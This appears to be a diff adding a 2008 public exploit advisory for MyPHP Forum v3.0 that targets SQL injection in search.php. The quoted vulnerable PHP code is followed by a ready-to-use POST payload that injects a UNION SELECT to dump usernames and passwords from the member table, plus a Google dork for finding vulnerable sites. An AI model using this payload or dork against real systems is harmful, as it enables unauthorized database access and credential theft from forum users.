@@ -1,0 +1,122 @@
+#=================================================================================================# 
+#                     ____            __________         __             ____  __                  #
+#                    /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_                #
+#                     |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\               #
+#                     |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |                 #
+#                     |___|___|  /\__|  /______  /\___  >__|            |___||__|                 #
+#                              \/\______|      \/     \/                                          #
+#=================================================================================================#
+#                                    This is a Public Exploit.                                    #
+#				   Date: 03/01/2008 [dd,mm,yyyy]                                  #
+#                                                                                                 #
+#                                      !!!Happy New Year!!!                                       #
+#                                                                                                 #
+#=================================================================================================#
+#   MyPHP Forum v3.0 (Final) And Maybe Lower Multiple Sql Injection Vulnerabilities (Mq=Off/On)   #
+#                                                                                                 #
+#                                       Vendor:   www.myphp.ws                                    #
+#                                     Severity:   Highest                                         #
+#                                       Author:   The:Paradox                                     #
+#                                                                                                 #
+#=================================================================================================#                                                                                                 
+#                                       Proud To Be Italian.                                      #
+#=================================================================================================#
+"""                                                                                                
+                                            Related Codes:
+                                         search.php; line 14:
+
+if($_POST['submit']) {
+	$searchtext = $_POST['searchtext'];
+	$searchuser = $_POST['searchuser'];
+
+	if(!strstr($searchtext, '"')) {
+		$keywords = explode(" ", $searchtext);
+		for($i = 0; $i < count($keywords); $i++) {
+			if($sqladdon != "") {
+				$sqladdon .= " AND p.message LIKE '%$keywords[$i]%'";
+			} else {
+				$sqladdon .= "p.message LIKE '%$keywords[$i]%'";
+			}
+		}
+	} else {
+		$phrase = trim(stripslashes(strstr($searchtext, '"')));
+		$quotesarr = explode('"', $phrase);
+		$quotes = count($quotesarr);
+		$phrasecount = $quotes - (count(explode('" "', $phrase)) + 1);
+
+		for($i = 0; $i < $quotes; $i++) {
+			if($i != 0 && $i != $quotes - 1) {
+				if($phraseoff != "yes") {
+					$phraselist .= "$quotesarr[$i]|";
+					$phraseoff = "yes";
+				} else {
+					$phraseoff = "no";
+				}
+			}
+		}
+
+		$phrasearr = explode("|", $phraselist);
+		$phrases = count($phrasearr) - 1;
+
+		for($i = 0; $i < $phrases; $i++) {
+			if($sqladdon != "") {
+				$sqladdon .= " AND p.message LIKE '%$phrasearr[$i]%'";
+			} else {
+				$sqladdon .= "p.message LIKE '%$phrasearr[$i]%'";
+			}
+		}
+		
+		$newsearchtxt = trim(str_replace("$phrase", "", stripslashes($searchtext)));
+
+		if($newsearchtxt != "") {
+			$keywords = explode(" ", $newsearchtxt);
+		}
+
+		for($i = 0; $i < count($keywords); $i++) {
+			if($sqladdon != "") {
+				$sqladdon .= " AND p.message LIKE '%$keywords[$i]%'";
+			} else {
+				$sqladdon .= "p.message LIKE '%$keywords[$i]%'";
+			}
+		}
+	}
+
+	if($searchuser != "") {
+		if($sqladdon != "") {
+				$sqladdon .= " AND p.author LIKE '%$searchuser%'";
+			} else {
+				$sqladdon .= "p.author LIKE '%$searchuser%'";
+			}
+	}
+
+	if($sqladdon != "" ) {
+		search_header();
+		$ttnum = 1;		// Now the Vulnerable Query =)
+		$query = mysql_query("SELECT t.*, f.name AS forum FROM $db_post p, $db_topic t, $db_forum f WHERE $sqladdon AND t.tid=p.tid AND f.fid=t.fid") or die(mysql_error());
+		
+"""
+#=================================================================================================#
+# Proof Of Concept / Bug Explanation:                                                             #
+#                                                                                                 #
+# A lot of Sql injection Vulnerabilities were found in this platform, but most of them work only  #
+# with the server configuration Magic Quotes Off.                                                 #
+# Whatever in Search.php there is a $searchtext is not propelly checked before the mysql_query.   #
+# The page does stripslashes to $searchtext var making us able to do an Sql injection with the    #
+# configuration of Magic Quotes On.                                                               #
+#                                                                                                 #
+#=================================================================================================#
+# Post Query :                                                                                    
+#                                                                                                 
+# submit=Search&searchtext=%'/**/UNION/**/SELECT/**/0,0,0,concat('<BR/><h3>-=ParadoxGotThisOne=-</h3><BR/><h4>Username:',username,'<BR/>Password:',password,'</h4>'),0,0,0,0,0,0/**/FROM/**/[Prefix]_member/**/WHERE/**/uid=[Id]/*"
+#                                                                                                 
+# Attenction: the last " is needed (see code).                                                    
+#                                                                                                 
+#=================================================================================================#
+# Other injection vulnerabilities were found, but them were not pulished.                         #
+#=================================================================================================#
+# Google Dork=> Powered by MyPHP Forum v3.0                                                       #
+#=================================================================================================#
+# Use this at your own risk. You are responsible for your own deeds.                              #
+#=================================================================================================#
+
+# milw0rm.com [2008-01-03]
